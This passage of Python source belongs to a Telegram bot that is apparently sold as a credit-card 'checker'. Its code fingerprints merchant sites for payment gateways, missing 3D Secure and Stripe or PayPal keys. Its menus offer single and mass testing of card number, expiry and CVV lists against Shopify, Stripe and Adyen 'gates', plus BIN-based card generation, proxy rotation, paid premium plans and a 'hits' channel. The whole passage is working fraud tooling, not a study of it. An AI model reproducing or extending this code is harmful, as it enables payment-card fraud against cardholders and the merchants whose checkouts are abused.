            break
    if not found and "braintree.dropin" in h:
        found.append("Braintree")

    # WooCommerce
    if "wp-content/plugins/woocommerce" in h or "woocommerce" in h:
        found.append("WooCommerce")

    # Authorize.net
    for s in srcs:
        if "authorize.net" in s.lower() or "accept.js" in s.lower():
            found.append("Authorize.net")
            break

    # Square
    for s in srcs:
        if "square.com/checkout" in s.lower() or "squarecdn.com" in s.lower():
            found.append("Square")
            break
    if not found and "sqpaymentform" in h:
        found.append("Square")

    # Razorpay
    for s in srcs:
        if "razorpay.com" in s.lower():
            found.append("Razorpay")
            break
    if not found and "razorpay" in h:
        found.append("Razorpay")

    # Adyen
    for s in srcs:
        if "adyen.com" in s.lower():
            found.append("Adyen")
            break
    if not found and "adyen." in h:
        found.append("Adyen")

    # Mollie
    for s in srcs:
        if "mollie.com" in s.lower():
            found.append("Mollie")
            break
    if not found and "mollie." in h:
        found.append("Mollie")

    # Klarna
    if "klarna." in h or "klarna.com" in h:
        found.append("Klarna")

    # Afterpay
    if "afterpay" in h or "clearpay" in h:
        found.append("Afterpay")

    # Mercado Pago
    for s in srcs:
        if "mercadopago.com" in s.lower():
            found.append("Mercado Pago")
            break
    if not found and "mercadopago" in h:
        found.append("Mercado Pago")

    # PagSeguro
    for s in srcs:
        if "pagseguro" in s.lower():
            found.append("PagSeguro")
            break
    if not found and "pagseguro" in h:
        found.append("PagSeguro")

    # Paddle
    for s in srcs:
        if "paddle.com" in s.lower() or "paddle." in s.lower():
            found.append("Paddle")
            break
    if not found and "paddle." in h:
        found.append("Paddle")

    return list(dict.fromkeys(found))


def detect_cms(html: str) -> list[str]:
    found = []
    h = html.lower()

    if "/wp-content/" in h or "wp-json" in h:
        found.append("WordPress")
    if "woocommerce" in h:
        found.append("WooCommerce")
    if "myshopify.com" in h or "cdn.shopify.com" in h:
        found.append("Shopify")
    if "static/version" in h or "magento" in h:
        found.append("Magento")
    if "joomla" in h:
        found.append("Joomla")
    if "drupal.js" in h or "drupal.org" in h:
        found.append("Drupal")
    if "prestashop" in h:
        found.append("PrestaShop")
    if "bigcommerce.com" in h:
        found.append("BigCommerce")
    if "wixstatic.com" in h:
        found.append("Wix")
    if "squarespace.com" in h:
        found.append("Squarespace")
    if "webflow" in h:
        found.append("Webflow")
    if "weebly.com" in h:
        found.append("Weebly")

    return list(dict.fromkeys(found)) if found else ["Unknown"]


def detect_captcha(html: str) -> str | None:
    h = html.lower()
    if "recaptcha" in h or "g-recaptcha" in h:
        return "reCAPTCHA"
    if "hcaptcha" in h:
        return "hCaptcha"
    if "turnstile" in h or "cf-turnstile" in h:
        return "Cloudflare Turnstile"
    return None


def detect_cloudflare(headers, html: str) -> str | None:
    h = html.lower()
    if "__cfduid" in h or "cf-browser-verification" in h:
        return "Cloudflare"
    return None


def detect_cdn(html: str, headers) -> str | None:
    h = html.lower()
    if "cloudflare" in h:
        return "Cloudflare"
    if "fastly" in h:
        return "Fastly"
    if "akamai" in h:
        return "Akamai"
    if "cloudfront" in h:
        return "AWS CloudFront"
    return None


def detect_3d_secure(html: str) -> str:
    h = html.lower()
    if any(x in h for x in ["3d_secure", "3dsecure", "requires_action", "cardinalcommerce", "cavv"]):
        return "3D Secure Found ✅"
    return "2D (No 3D Secure Found ❌)"


def detect_graphql(html: str) -> str:
    h = html.lower()
    if "/graphql" in h or "graphql" in h:
        return "GraphQL Found ✅"
    return "No GraphQL Found ❌"


def extract_gateway_keys(html: str) -> dict[str, list[str]]:
    result = {}

    # Stripe keys
    stripe_keys = re.findall(r'pk_(?:live|test)_[A-Za-z0-9_-]{10,}', html)
    if stripe_keys:
        result["Stripe"] = list(dict.fromkeys(stripe_keys))

    # PayPal client IDs
    paypal_keys = re.findall(
        r'client-id[=:][\'"]?([A-Za-z0-9_-]{30,})', html, re.IGNORECASE)
    if paypal_keys:
        result["PayPal"] = list(dict.fromkeys(paypal_keys))

    return result


def detect_analytics(html: str, srcs: list[str]) -> list[str]:
    found = []
    h = html.lower()

    for s in srcs:
        if "google-analytics.com" in s.lower() or "googletagmanager.com" in s.lower():
            if "Google Analytics" not in found:
                found.append("Google Analytics")
        elif "connect.facebook.net" in s.lower():
            if "Facebook Pixel" not in found:
                found.append("Facebook Pixel")
        elif "hotjar.com" in s.lower():
            if "Hotjar" not in found:
                found.append("Hotjar")

    if not found:
        if "gtag" in h or "ga(" in h:
            found.append("Google Analytics")
        if "fbq(" in h:
            found.append("Facebook Pixel")

    return found


@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    chat_id = event.chat_id
    await save_bot_user(user_id)
    if chat_id and chat_id != user_id:
        await save_bot_user(chat_id)
    is_prem = await is_premium(user_id)
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"

    plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"

    sites_data = await load_sites_with_price(user_id)
    total_sites = len(sites_data)

    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)

    filter_text = ""
    for f in gateway_filters:
        if f.get('all', False):
            count = total_sites
        else:
            count = len([s for s in sites_data if f['min']
                        <= s.get('price', 0) < f['max']])
        filter_text += f"   ┣ {f['name']}  {count}\n"

    welcome_text = f"""━━━━━━━━━━━━━━━━━━
▸ 👋 Hᴇʏ  · @{username}
▸ ᴘʟɴ  · {plan}
▸ Sʜᴏᴘɪғʏ & Sᴛʀɪᴘᴇ
━━━━━━━━━━━━━━━━━
<code>/cc</code> · <code>/chk</code> · <code>/redeem</code>
<code>/st0</code> · <code>/mst0</code>
━━━━━━━━━━━━━━━━━
One day I will be the best 
💡 Bᴏᴛ Dᴇᴠ @OwnerGhostHex
 Vᴇʀsɪᴏɴ -»3.0 🚀
━━━━━━━━━━━━━━━━━"""

    buttons = get_main_menu_keyboard(user_id)
    await safe_reply(event, welcome_text, buttons=buttons, parse_mode='html')



@bot.on(events.NewMessage(pattern=r'^/(cmds|commands)(?:\s|$)'))
async def cmds_command_handler(event):
    user_id = event.sender_id
    commands_text = """📋 <b>Bᴏᴛ Cᴏᴍᴍᴀɴᴅs Gᴜɪᴅᴇ</b>

🌐 <b>1. Pʀɪᴠᴀᴛᴇ Sɪᴛᴇs & Pʀᴏxɪᴇs (Mɪɴ 10)</b>
├─ <code>/addproxy</code> → Aᴅᴅ ᴘʀᴏxɪᴇs (ᴘᴀsᴛᴇ ᴏʀ ʀᴇᴘʟʏ .ᴛxᴛ)
├─ <code>/proxy</code> → Cʜᴇᴄᴋ & ᴄʟᴇᴀɴ ʏᴏᴜʀ ᴘʀᴏxɪᴇs
├─ <code>/getproxy</code> → Dᴏᴡɴʟᴏᴀᴅ ʏᴏᴜʀ ᴘʀᴏxʏ ʟɪsᴛ (.ᴛxᴛ)
├─ <code>/addsites</code> → Aᴅᴅ sɪᴛᴇs (ᴘᴀsᴛᴇ ᴏʀ ʀᴇᴘʟʏ .ᴛxᴛ)
├─ <code>/site</code> → Cʜᴇᴄᴋ & ʀᴇғʀᴇsʜ ʏᴏᴜʀ sɪᴛᴇ ᴘʀɪᴄᴇs
└─ <code>/getsites</code> → Dᴏᴡɴʟᴏᴀᴅ ʏᴏᴜʀ sɪᴛᴇ ʟɪsᴛ (.ᴛxᴛ)

🛒 <b>2. Cᴀʀᴅ Cʜᴇᴄᴋɪɴɢ (Pʟᴀɴ Rᴇǫᴜɪʀᴇᴅ)</b>
├─ <code>/cc ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
├─ <code>/chk</code> (ʀᴇᴘʟʏ ᴛᴏ .ᴛxᴛ) → Mᴀss ᴄᴀʀᴅ ᴄʜᴇᴄᴋ
├─ <code>/ady1</code> & <code>/ady2</code> → Aᴅʏᴇɴ CCN Gᴀᴛᴇs
└─ <code>/st0</code> → Sᴛʀɪᴘᴇ Cʜᴇᴄᴋᴇʀ ($0.50)

🛠️ <b>3. Fʀᴇᴇ Uᴛɪʟɪᴛɪᴇs (Nᴏ Pʟᴀɴ Nᴇᴇᴅᴇᴅ)</b>
├─ <code>/bin 415920</code> → BIN Lᴏᴏᴋᴜᴘ
├─ <code>/gen 415920 10</code> → Gᴇɴᴇʀᴀᴛᴇ CCs (Mᴀx 5,000)
├─ <code>/split 500</code> → Sᴘʟɪᴛ ғɪʟᴇ (ʀᴇᴘʟʏ ᴛᴏ ғɪʟᴇ)
├─ <code>/clean</code> → Cʟᴇᴀɴ ᴇxᴘɪʀᴇᴅ ᴄᴀʀᴅs
└─ <code>/sk</code> • <code>/ip</code> • <code>/fake</code> • <code>/iban</code>

👑 <b>4. Aᴄᴄᴏᴜɴᴛ & Pʟᴀɴs</b>
├─ <code>/me</code> ᴏʀ <code>/id</code> → Vɪᴇᴡ ʏᴏᴜʀ ᴘʟᴀɴ & sᴛᴀᴛs
├─ <code>/buy</code> → Vɪᴇᴡ ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs
└─ <code>/redeem Kᴇʏ</code> → Rᴇᴅᴇᴇᴍ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ"""
    buttons = [[Button.inline(" Bᴀᴄᴋ", b"main_menu", style="danger", icon=5445365692004071819)]]
    await event.reply(premium_emoji(commands_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = """📋 <b>Bᴏᴛ Cᴏᴍᴍᴀɴᴅs Gᴜɪᴅᴇ</b>

🌐 <b>1. Pʀɪᴠᴀᴛᴇ Sɪᴛᴇs & Pʀᴏxɪᴇs (Mɪɴ 10)</b>
├─ <code>/addproxy</code> → Aᴅᴅ ᴘʀᴏxɪᴇs (ᴘᴀsᴛᴇ ᴏʀ ʀᴇᴘʟʏ .ᴛxᴛ)
├─ <code>/proxy</code> → Cʜᴇᴄᴋ & ᴄʟᴇᴀɴ ʏᴏᴜʀ ᴘʀᴏxɪᴇs
├─ <code>/getproxy</code> → Dᴏᴡɴʟᴏᴀᴅ ʏᴏᴜʀ ᴘʀᴏxʏ ʟɪsᴛ (.ᴛxᴛ)
├─ <code>/addsites</code> → Aᴅᴅ sɪᴛᴇs (ᴘᴀsᴛᴇ ᴏʀ ʀᴇᴘʟʏ .ᴛxᴛ)
├─ <code>/site</code> → Cʜᴇᴄᴋ & ʀᴇғʀᴇsʜ ʏᴏᴜʀ sɪᴛᴇ ᴘʀɪᴄᴇs
└─ <code>/getsites</code> → Dᴏᴡɴʟᴏᴀᴅ ʏᴏᴜʀ sɪᴛᴇ ʟɪsᴛ (.ᴛxᴛ)

🛒 <b>2. Cᴀʀᴅ Cʜᴇᴄᴋɪɴɢ (Pʟᴀɴ Rᴇǫᴜɪʀᴇᴅ)</b>
├─ <code>/cc ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
├─ <code>/chk</code> (ʀᴇᴘʟʏ ᴛᴏ .ᴛxᴛ) → Mᴀss ᴄᴀʀᴅ ᴄʜᴇᴄᴋ
├─ <code>/ady1</code> & <code>/ady2</code> → Aᴅʏᴇɴ CCN Gᴀᴛᴇs
└─ <code>/st0</code> → Sᴛʀɪᴘᴇ Cʜᴇᴄᴋᴇʀ ($0.50)

🛠️ <b>3. Fʀᴇᴇ Uᴛɪʟɪᴛɪᴇs (Nᴏ Pʟᴀɴ Nᴇᴇᴅᴇᴅ)</b>
├─ <code>/bin 415920</code> → BIN Lᴏᴏᴋᴜᴘ
├─ <code>/gen 415920 10</code> → Gᴇɴᴇʀᴀᴛᴇ CCs (Mᴀx 5,000)
├─ <code>/split 500</code> → Sᴘʟɪᴛ ғɪʟᴇ (ʀᴇᴘʟʏ ᴛᴏ ғɪʟᴇ)
├─ <code>/clean</code> → Cʟᴇᴀɴ ᴇxᴘɪʀᴇᴅ ᴄᴀʀᴅs
└─ <code>/sk</code> • <code>/ip</code> • <code>/fake</code> • <code>/iban</code>

👑 <b>4. Aᴄᴄᴏᴜɴᴛ & Pʟᴀɴs</b>
├─ <code>/me</code> ᴏʀ <code>/id</code> → Vɪᴇᴡ ʏᴏᴜʀ ᴘʟᴀɴ & sᴛᴀᴛs
├─ <code>/buy</code> → Vɪᴇᴡ ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs
└─ <code>/redeem Kᴇʏ</code> → Rᴇᴅᴇᴇᴍ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ"""
    buttons = [[Button.inline(" Bᴀᴄᴋ", b"main_menu",
                              style="danger", icon=5445365692004071819)]]
    await safe_edit(event, premium_emoji(commands_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ.", alert=True)
        return
    admin_text = """👑 <b>Aᴅᴍɪɴ Pᴀɴᴇʟ</b>

📋 <b>Pʀᴇᴍɪᴜᴍ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/addpremium ᴜsᴇʀ_ɪᴅ ᴅᴀʏs [ᴘʟᴀɴ]</code> → Aᴅᴅ ᴜsᴇʀ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/addadmpremium ᴜsᴇʀ_ɪᴅ ᴘʟᴀɴ ᴅᴀʏs</code> → Aᴅᴅ ᴜsᴇʀ (Aɴᴛɪ-Gᴇɴ Bᴀɴ Exᴇᴍᴘᴛ)
├─ <code>/removeadmpremium ᴜsᴇʀ_ɪᴅ</code> → Rᴇᴠᴏᴋᴇ Aᴅᴍ Pʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs
├─ <code>/listadmpremium</code> → Lɪsᴛ ᴀʟʟ Aᴅᴍ Pʀᴇᴍɪᴜᴍ ᴜsᴇʀs
├─ <code>/addtime 30</code> → Aᴅᴅ ᴅᴀʏs/ʜᴏᴜʀs ᴛᴏ ᴜsᴇʀ
├─ <code>/addlimit 4000</code> → Iɴᴄʀᴇᴀsᴇ ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ ʟɪᴍɪᴛ
├─ <code>/addadmin ᴜsᴇʀ_ɪᴅ</code> → Pʀᴏᴍᴏᴛᴇ ᴜsᴇʀ ᴛᴏ ᴀᴅᴍɪɴ
├─ <code>/removepremium ᴜsᴇʀ_ɪᴅ</code> → Rᴇᴍᴏᴠᴇ ᴜsᴇʀ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/unban ᴜsᴇʀ_ɪᴅ</code> → Uɴʙᴀɴ ᴜsᴇʀ (sᴡɪᴛᴄʜ ᴛᴏ Fʀᴇᴇ ᴍᴏᴅᴇ)
├─ <code>/listbanned</code> → Lɪsᴛ ᴀʟʟ ʙᴀɴɴᴇᴅ ᴜsᴇʀs
├─ <code>/unbanall</code> → Uɴʙᴀɴ ᴀʟʟ ʙᴀɴɴᴇᴅ ᴜsᴇʀs
├─ <code>/listpremium</code> → Lɪsᴛ ᴀʟʟ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs
├─ <code>/genkeys ᴀᴍᴏᴜɴᴛ ᴘʟᴀɴ [ʟɪᴍɪᴛ]</code> → Gᴇɴᴇʀᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏs
└─ <code>/unusedkeys</code> → Vɪᴇᴡ ᴀʟʟ ᴜɴᴜsᴇᴅ ᴋᴇʏs

💎 <b>Adyen (Admin Only)</b>
├─ <code>/ady1 ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ CCN 1 (sɪɴɢʟᴇ / ᴍᴀss)
├─ <code>/ady2 ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ CCN 2 (sɪɴɢʟᴇ / ᴍᴀss)
├─ <code>/mady1</code> → Mᴀss ᴄʜᴇᴄᴋ CCN 1 (.ᴛxᴛ ғɪʟᴇ)
└─ <code>/mady2</code> → Mᴀss ᴄʜᴇᴄᴋ CCN 2 (.ᴛxᴛ ғɪʟᴇ)

🌐 <b>Sɪᴛᴇs & API Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/health</code> → Cʜᴇᴄᴋ API sᴇʀᴠᴇʀs ʜᴇᴀʟᴛʜ
├─ <code>/clearcache</code> → Cʟᴇᴀʀ API sᴇʀᴠᴇʀs ᴄᴀᴄʜᴇ
├─ <code>/addsites</code> → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sɪᴛᴇs
├─ <code>/site</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs
├─ <code>/rm ᴜʀʟ</code> → Rᴇᴍᴏᴠᴇ sᴘᴇᴄɪғɪᴄ sɪᴛᴇ
├─ <code>/getsites</code> → Dᴏᴡɴʟᴏᴀᴅ ᴄᴜʀʀᴇɴᴛ sɪᴛᴇs.ᴛxᴛ
├─ <code>/setfilter shopify_global ᴍɪɴ-ᴍᴀx "Nᴀᴍᴇ"</code> → Aᴅᴅ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ
├─ <code>/listfilters</code> → Vɪᴇᴡ ᴀʟʟ ғɪʟᴛᴇʀs
└─ <code>/removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ</code> → Rᴇᴍᴏᴠᴇ ᴀ ғɪʟᴛᴇʀ

🔌 <b>Pʀᴏxʏ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/proxy</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ ᴘʀᴏxɪᴇs
├─ <code>/addproxy</code> → Aᴅᴅ ᴘʀᴏxɪᴇs
├─ <code>/chkproxy ᴘʀᴏxʏ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ <code>/rmproxy ᴘʀᴏxʏ</code> → Rᴇᴍᴏᴠᴇ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ <code>/rmproxyindex 1,2,3</code> → Rᴇᴍᴏᴠᴇ ʙʏ ɪɴᴅᴇx
├─ <code>/clearproxy</code> → Rᴇᴍᴏᴠᴇ ᴀʟʟ ᴘʀᴏxɪᴇs
└─ <code>/getproxy</code> → Gᴇᴛ ᴀʟʟ ᴘʀᴏxɪᴇs

📊 <b>Bᴏᴛ & Usᴇʀ Sᴛᴀᴛɪsᴛɪᴄs</b>
├─ <code>/users</code> → Aʟʟ ᴜsᴇʀs ᴏᴠᴇʀᴠɪᴇᴡ & ғᴜʟʟ ʀᴇᴘᴏʀᴛ (.ᴛxᴛ)
├─ <code>/user &lt;id&gt;</code> → Iɴsᴘᴇᴄᴛ ᴀ sᴘᴇᴄɪғɪᴄ ᴜsᴇʀ (sɪᴛᴇs, ᴘʀᴏxɪᴇs, sᴛᴀᴛs)
├─ <code>/getallsites</code> → Dᴏᴡɴʟᴏᴀᴅ ALL ᴜsᴇʀ sɪᴛᴇs (.ᴛxᴛ)
├─ <code>/getallproxies</code> → Dᴏᴡɴʟᴏᴀᴅ ALL ᴜsᴇʀ ᴘʀᴏxɪᴇs (.ᴛxᴛ)
├─ <code>/stats</code> → Sʜᴏᴡ ɢᴇɴᴇʀᴀʟ ʙᴏᴛ sᴛᴀᴛɪsᴛɪᴄs
└─ <code>/brod</code> → Rᴇᴘʟʏ ᴛᴏ ᴀɴʏ ᴍᴇssᴀɢᴇ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ

🔧 <b>Hɪᴛs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/sethits ᴄʜᴀɴɴᴇʟ_ɪᴅ</code> → Sᴇᴛ ʜɪᴛs ᴄʜᴀɴɴᴇʟ
└─ <code>/hits</code> → Tᴏɢɢʟᴇ ʜɪᴛs ᴏɴ/ᴏғғ"""
    buttons = [[Button.inline(" Bᴀᴄᴋ", b"main_menu",
                              style="danger", icon=5445365692004071819)]]
    await safe_edit(event, premium_emoji(admin_text), buttons=buttons, parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/admin(?:\s|$)'))
async def admin_command_handler(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    admin_text = """👑 <b>Aᴅᴍɪɴ Pᴀɴᴇʟ</b>

📋 <b>Pʀᴇᴍɪᴜᴍ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/addpremium ᴜsᴇʀ_ɪᴅ ᴅᴀʏs [ᴘʟᴀɴ]</code> → Aᴅᴅ ᴜsᴇʀ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/addadmpremium ᴜsᴇʀ_ɪᴅ ᴘʟᴀɴ ᴅᴀʏs</code> → Aᴅᴅ ᴜsᴇʀ (Aɴᴛɪ-Gᴇɴ Bᴀɴ Exᴇᴍᴘᴛ)
├─ <code>/removeadmpremium ᴜsᴇʀ_ɪᴅ</code> → Rᴇᴠᴏᴋᴇ Aᴅᴍ Pʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs
├─ <code>/listadmpremium</code> → Lɪsᴛ ᴀʟʟ Aᴅᴍ Pʀᴇᴍɪᴜᴍ ᴜsᴇʀs
├─ <code>/addtime 30</code> → Aᴅᴅ ᴅᴀʏs/ʜᴏᴜʀs ᴛᴏ ᴜsᴇʀ
├─ <code>/addlimit 4000</code> → Iɴᴄʀᴇᴀsᴇ ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ ʟɪᴍɪᴛ
├─ <code>/addadmin ᴜsᴇʀ_ɪᴅ</code> → Pʀᴏᴍᴏᴛᴇ ᴜsᴇʀ ᴛᴏ ᴀᴅᴍɪɴ
├─ <code>/removepremium ᴜsᴇʀ_ɪᴅ</code> → Rᴇᴍᴏᴠᴇ ᴜsᴇʀ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/unban ᴜsᴇʀ_ɪᴅ</code> → Uɴʙᴀɴ ᴜsᴇʀ (sᴡɪᴛᴄʜ ᴛᴏ Fʀᴇᴇ ᴍᴏᴅᴇ)
├─ <code>/listbanned</code> → Lɪsᴛ ᴀʟʟ ʙᴀɴɴᴇᴅ ᴜsᴇʀs
├─ <code>/unbanall</code> → Uɴʙᴀɴ ᴀʟʟ ʙᴀɴɴᴇᴅ ᴜsᴇʀs
├─ <code>/listpremium</code> → Lɪsᴛ ᴀʟʟ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs
├─ <code>/genkeys ᴀᴍᴏᴜɴᴛ ᴘʟᴀɴ [ʟɪᴍɪᴛ]</code> → Gᴇɴᴇʀᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏs
└─ <code>/unusedkeys</code> → Vɪᴇᴡ ᴀʟʟ ᴜɴᴜsᴇᴅ ᴋᴇʏs

💎 <b>Adyen (Admin Only)</b>
├─ <code>/ady1 ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ CCN 1 (sɪɴɢʟᴇ / ᴍᴀss)
├─ <code>/ady2 ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ CCN 2 (sɪɴɢʟᴇ / ᴍᴀss)
├─ <code>/mady1</code> → Mᴀss ᴄʜᴇᴄᴋ CCN 1 (.ᴛxᴛ ғɪʟᴇ)
└─ <code>/mady2</code> → Mᴀss ᴄʜᴇᴄᴋ CCN 2 (.ᴛxᴛ ғɪʟᴇ)

🌐 <b>Sɪᴛᴇs & API Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/health</code> → Cʜᴇᴄᴋ API sᴇʀᴠᴇʀs ʜᴇᴀʟᴛʜ
├─ <code>/clearcache</code> → Cʟᴇᴀʀ API sᴇʀᴠᴇʀs ᴄᴀᴄʜᴇ
├─ <code>/addsites</code> → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sɪᴛᴇs
├─ <code>/site</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs
├─ <code>/rm ᴜʀʟ</code> → Rᴇᴍᴏᴠᴇ sᴘᴇᴄɪғɪᴄ sɪᴛᴇ
├─ <code>/getsites</code> → Dᴏᴡɴʟᴏᴀᴅ ᴄᴜʀʀᴇɴᴛ sɪᴛᴇs.ᴛxᴛ
├─ <code>/setfilter shopify_global ᴍɪɴ-ᴍᴀx "Nᴀᴍᴇ"</code> → Aᴅᴅ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ
├─ <code>/listfilters</code> → Vɪᴇᴡ ᴀʟʟ ғɪʟᴛᴇʀs
└─ <code>/removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ</code> → Rᴇᴍᴏᴠᴇ ᴀ ғɪʟᴛᴇʀ

🔌 <b>Pʀᴏxʏ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/proxy</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ ᴘʀᴏxɪᴇs
├─ <code>/addproxy</code> → Aᴅᴅ ᴘʀᴏxɪᴇs
├─ <code>/chkproxy ᴘʀᴏxʏ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ <code>/rmproxy ᴘʀᴏxʏ</code> → Rᴇᴍᴏᴠᴇ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ <code>/rmproxyindex 1,2,3</code> → Rᴇᴍᴏᴠᴇ ʙʏ ɪɴᴅᴇx
├─ <code>/clearproxy</code> → Rᴇᴍᴏᴠᴇ ᴀʟʟ ᴘʀᴏxɪᴇs
└─ <code>/getproxy</code> → Gᴇᴛ ᴀʟʟ ᴘʀᴏxɪᴇs

📊 <b>Bᴏᴛ & Usᴇʀ Sᴛᴀᴛɪsᴛɪᴄs</b>
├─ <code>/users</code> → Aʟʟ ᴜsᴇʀs ᴏᴠᴇʀᴠɪᴇᴡ & ғᴜʟʟ ʀᴇᴘᴏʀᴛ (.ᴛxᴛ)
├─ <code>/user &lt;id&gt;</code> → Iɴsᴘᴇᴄᴛ ᴀ sᴘᴇᴄɪғɪᴄ ᴜsᴇʀ (sɪᴛᴇs, ᴘʀᴏxɪᴇs, sᴛᴀᴛs)
├─ <code>/getallsites</code> → Dᴏᴡɴʟᴏᴀᴅ ALL ᴜsᴇʀ sɪᴛᴇs (.ᴛxᴛ)
├─ <code>/getallproxies</code> → Dᴏᴡɴʟᴏᴀᴅ ALL ᴜsᴇʀ ᴘʀᴏxɪᴇs (.ᴛxᴛ)
├─ <code>/stats</code> → Sʜᴏᴡ ɢᴇɴᴇʀᴀʟ ʙᴏᴛ sᴛᴀᴛɪsᴛɪᴄs
└─ <code>/brod</code> → Rᴇᴘʟʏ ᴛᴏ ᴀɴʏ ᴍᴇssᴀɢᴇ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ

🔧 <b>Hɪᴛs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/sethits ᴄʜᴀɴɴᴇʟ_ɪᴅ</code> → Sᴇᴛ ʜɪᴛs ᴄʜᴀɴɴᴇʟ
└─ <code>/hits</code> → Tᴏɢɢʟᴇ ʜɪᴛs ᴏɴ/ᴏғғ"""
    await event.reply(premium_emoji(admin_text), parse_mode='html')


@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"

    is_prem = await is_premium(user_id)
    plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"

    sites_data = await load_sites_with_price(user_id)
    total_sites = len(sites_data)

    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)

    filter_text = ""
    for f in gateway_filters:
        if f.get('all', False):
            count = total_sites
        else:
            count = len([s for s in sites_data if f['min']
                        <= s.get('price', 0) < f['max']])
        filter_text += f"   ┣ {f['name']}  {count}\n"

    welcome_text = f"""━━━━━━━━━━━━━━━━━━
▸ 👋 Hᴇʏ  · @{username}
▸ ᴘʟɴ  · {plan}
▸ Sʜᴏᴘɪғʏ
━━━━━━━━━━━━━━━━━
<code>/cc</code> · <code>/chk</code> · <code>/redeem</code>
━━━━━━━━━━━━━━━━━
One day I will be the best 
💡 Bᴏᴛ Dᴇᴠ @OwnerGhostHex
 Vᴇʀsɪᴏɴ -»3.0 🚀
━━━━━━━━━━━━━━━━━"""

    buttons = get_main_menu_keyboard(user_id)
    await safe_edit(event, premium_emoji(welcome_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"tools_menu"))
async def tools_menu_callback(event):
    user_id = event.sender_id

    tools_text = """🛠️ <b>Tᴏᴏʟs Mᴇɴᴜ • Pᴀɢᴇ 1/3</b>

📂 <b>Fɪʟᴇ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/split</code> → Sᴘʟɪᴛ ᴄᴀʀᴅs ɪɴᴛᴏ ᴘᴀʀᴛs
│    <code>/split 500</code> (ʀᴇᴘʟʏ ᴛᴏ ғɪʟᴇ)
